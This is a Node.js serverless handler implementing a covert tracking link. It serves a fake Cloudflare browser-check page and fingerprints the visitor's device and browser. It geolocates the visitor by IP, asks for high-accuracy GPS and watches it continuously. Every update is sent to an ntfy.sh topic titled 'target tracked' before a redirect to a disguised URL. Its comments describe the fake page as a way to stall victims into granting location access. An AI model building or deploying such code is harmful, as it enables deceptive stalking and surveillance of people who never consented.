const axios = require('axios');

module.exports = async (req, res) => {
    const { topic, t } = req.query;

    let targetUrl = 'https://google.com';
    if (t) {
        try { targetUrl = Buffer.from(t, 'base64').toString('utf-8'); } catch (e) { }
    }

    if (!topic) {
        return res.redirect(301, targetUrl);
    }

    // Server-side IP Info (Baseline)
    const ipRaw = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || '';
    const cleanIp = ipRaw.split(',')[0].trim();

    let geo = {};
    if (cleanIp) {
        try {
            const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`);
            geo = geoReq.data;
        } catch (e) { }
    }

    // We serve an HTML page that does the fingerprinting + redirection
    // This allows us to use Browser APIs and gives a fake loading screen to buy time
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        body { margin: 0; padding: 0; background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .cf-wrapper { text-align: center; max-width: 600px; padding: 20px; }
        .cf-spinner { border: 4px solid transparent; border-top: 4px solid #f68b1e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: normal; margin-bottom: 20px; }
        p { font-size: 15px; color: #555; }
        .cf-footer { margin-top: 50px; font-size: 13px; color: #999; }
    </style>
</head>
<body>
    <div class="cf-wrapper">
        <div class="cf-spinner"></div>
        <h1>Checking your browser before accessing the site.</h1>
        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p>Please allow up to 5 seconds…</p>
        <div class="cf-footer">Ray ID: ${Math.random().toString(36).substring(2, 12)} • Performance & security by Cloudflare</div>
    </div>
    <script>
        async function capture() {
            // Level 4 Pegasus-Lite Advanced Fingerprinting: Canvas Hash
            const generateCanvasHash = () => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic";
                    ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
                    ctx.fillStyle = "#069"; ctx.fillText("🕵️‍♂️SINTEL-HP" + navigator.userAgent, 2, 15);
                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("🕵️‍♂️SINTEL-HP", 4, 17);
                    const dataURI = canvas.toDataURL();
                    let hash = 0;
                    for (let i = 0; i < dataURI.length; i++) {
                        hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
                        hash = hash & hash;
                    }
                    return Math.abs(hash).toString(16);
                } catch (e) { return "Unknown"; }
            };

            const payload = {
                ip: "${cleanIp}",
                lat: ${geo.lat || 'null'},
                lon: ${geo.lon || 'null'},
                city: "${geo.city || geo.regionName || 'Unknown'}",
                ua: navigator.userAgent,
                time: new Date().toISOString(),
                // Fingerprinting Level 4 (Pegasus-Pro)
                device_hash: generateCanvasHash(),
                screen: window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + "bit)",
                cpu: navigator.hardwareConcurrency || '??',
                ram: navigator.deviceMemory || '??',
                platform: navigator.platform,
                gpu: 'Unknown',
                battery: 'Unknown',
                charging: 'Unknown',
                network: 'Unknown',
                speed: 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                language: navigator.language || 'Unknown',
                touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
            };

            // Network Info
            if (navigator.connection) {
                payload.network = navigator.connection.effectiveType || 'Unknown';
                payload.speed = navigator.connection.downlink ? (navigator.connection.downlink + " Mbps") : 'Unknown';
            }

            // Get GPU Info
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    payload.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}

            // Get Battery Info
            try {
                if (navigator.getBattery) {
                    const bt = await navigator.getBattery();
                    payload.battery = Math.round(bt.level * 100) + "%";
                    payload.charging = bt.charging ? "Charging" : "Unplugged";
                }
            } catch(e) {}

            // Initial PING (Fingerprint + IP)
            const sendPing = (data) => {
                fetch('https://ntfy.sh/${topic}', {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: { 'Title': 'Target Terlacak (Level 3)', 'Tags': 'high_brightness,skull' }
                });
            };

            sendPing(payload);

            // Real-time GPS Tracking
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    payload.lat = pos.coords.latitude;
                    payload.lon = pos.coords.longitude;
                    payload.accuracy = Math.round(pos.coords.accuracy) + "m";
                    payload.type = 'GPS_SAT';
                    sendPing(payload); // Send updated GPS
                    
                    // Start Watching (Live Movement)
                    navigator.geolocation.watchPosition((p) => {
                        payload.lat = p.coords.latitude;
                        payload.lon = p.coords.longitude;
                        payload.accuracy = Math.round(p.coords.accuracy) + "m";
                        sendPing(payload); 
                    });
                }, () => {}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
            }

            // Quick Redirect - delayed slightly more to allow user to stare at the fake cloudflare page
            // and potentially click 'allow' on a location prompt if it appears. (3 seconds)
            let redirectTimer = setTimeout(() => {
                window.location.replace("${targetUrl}");
            }, 3000);
            
            // If GPS is successfully retrieved quickly, we can redirect sooner, but let's just stick to the timeout for consistency.
        }
        capture();
    </script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    return res.status(200).send(html);
};
